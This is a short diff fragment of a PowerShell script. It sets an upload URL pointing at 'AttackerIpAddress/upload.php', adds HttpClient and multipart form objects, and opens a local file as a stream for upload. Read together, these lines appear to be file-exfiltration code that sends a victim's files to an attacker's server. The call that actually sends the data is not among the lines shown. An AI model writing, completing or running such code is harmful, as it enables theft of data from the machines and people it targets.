@@ -55,6 +55,8 @@ $url = 'http://AttackerIpAddress/upload.php'
 
 Add-Type -AssemblyName 'System.Net.Http'
 
+$client = New-Object System.Net.Http.HttpClient
+$content = New-Object System.Net.Http.MultipartFormDataContent
 $fileStream = [System.IO.File]::OpenRead($filePath)
 $fileName = [System.IO.Path]::GetFileName($filePath)
 $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
